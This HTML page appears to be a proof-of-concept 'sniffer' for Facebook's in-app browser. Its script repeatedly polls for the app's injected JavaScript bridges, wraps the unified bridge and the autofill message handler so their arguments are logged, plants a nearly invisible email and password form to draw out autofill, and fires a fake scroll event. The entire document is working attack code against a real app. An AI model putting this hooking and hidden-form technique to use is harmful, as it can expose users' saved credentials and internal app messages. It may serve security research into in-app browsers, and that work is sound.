<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>JSI Sniffer</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; word-wrap: break-word; font-size: 14px; }
        .alert { color: #ff0; padding-top: 10px; border-top: 1px solid #333; margin-top: 10px; }
    </style>
</head>
<body>
    <h3>Sniffing Facebook's Internal IPC...</h3>
    <div id="log">Waiting for Facebook to inject bridges...<br></div>

    <form style="opacity: 0.1;">
        <input type="text" name="email" autocomplete="username">
        <input type="password" name="password" autocomplete="current-password">
    </form>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerHTML += msg + "<br>"; }

        // We use a fast interval to catch the bridge the exact moment Facebook injects it
        let snifferInterval = setInterval(() => {
            
            // Hook the Unified Bridge
            if (window.__call_iabjs_unified_bridge && !window.__call_iabjs_unified_bridge._isHooked) {
                let realBridge = window.__call_iabjs_unified_bridge;
                
                window.__call_iabjs_unified_bridge = function() {
                    let args = Array.from(arguments);
                    log("<div class='alert'>🚨 <b>UNIFIED BRIDGE INTERCEPT:</b><br>" + JSON.stringify(args) + "</div>");
                    return realBridge.apply(this, arguments);
                };
                window.__call_iabjs_unified_bridge._isHooked = true;
                log("[+] Hooked __call_iabjs_unified_bridge!");
            }

            // Hook the Autofill Message Handler
            if (window._AutofillMessageHandler && window._AutofillMessageHandler.postMessage && !window._AutofillMessageHandler._isHooked) {
                let realAutofill = window._AutofillMessageHandler.postMessage;
                
                window._AutofillMessageHandler.postMessage = function() {
                    let args = Array.from(arguments);
                    log("<div class='alert'>🚨 <b>AUTOFILL INTERCEPT:</b><br>" + JSON.stringify(args) + "</div>");
                    return realAutofill.apply(this, arguments);
                };
                window._AutofillMessageHandler._isHooked = true;
                log("[+] Hooked _AutofillMessageHandler!");
            }

        }, 10); // Check every 10ms

        // Trigger a fake scroll event to wake up performance loggers
        setTimeout(() => { window.dispatchEvent(new Event('scroll')); }, 1000);
    </script>
</body>
</html>
